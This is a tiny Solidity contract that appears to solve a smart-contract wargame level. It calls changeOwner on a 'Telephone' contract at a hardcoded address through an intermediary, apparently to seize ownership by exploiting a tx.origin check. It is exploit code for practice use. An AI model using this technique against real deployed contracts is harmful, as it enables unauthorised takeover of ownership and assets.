contract hacktelephone {
    Telephone public instance=Telephone(0xC64E0214D0AE4aEb50f0a378C2664907d96fb489);
    function ChangeOwner(address _address) public {
        instance.changeOwner(_address);
}
}